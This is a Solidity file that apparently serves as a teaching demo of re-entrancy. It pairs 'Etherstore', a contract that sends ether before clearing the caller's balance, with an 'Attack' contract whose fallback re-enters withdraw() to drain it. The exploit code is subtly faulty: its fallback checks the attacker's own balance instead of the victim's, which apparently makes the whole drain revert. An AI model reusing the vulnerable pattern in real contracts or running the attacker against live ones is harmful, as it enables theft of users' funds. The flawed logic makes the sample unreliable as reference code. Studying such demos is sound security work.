pragma solidity ^0.8.0;
//Re-entrancy Attack
contract Etherstore{
    //contract to be attacked
    mapping(address => uint) public balances;

    function deposite() public payable{
        balances[msg.sender] += msg.value;
        }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        //cannot withdraw more than what you have
        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent,"operation failed");
        //there are three ways of sending ether; 1. send 2. transfer 3. call

        balances[msg.sender] = 0;

    }
    function getBalance() public view returns(uint){
        return address(this).balance;
        //to check how much is available in the contract
    }
    
}
    contract Attack{
        //Attacker smart contract
        Etherstore public etherstore;
        constructor(address _etherStoreAddress){
            //taking the address of the contract you want to attack
            etherstore = Etherstore(_etherStoreAddress);
        }
        //fallback is called when Etherscore send ether to this contract
        fallback() external payable{
            if(address(this).balance >=1){
                etherstore.withdraw();
            }
        }
        function attack() external payable{
            require (msg.value >= 1);
            etherstore.deposite{value: 1}();
            etherstore.withdraw();
        }
        //helper fuction to check the balance of this contract
        function getBalance() public view returns(uint){
            return address(this).balance;
        }
    } 
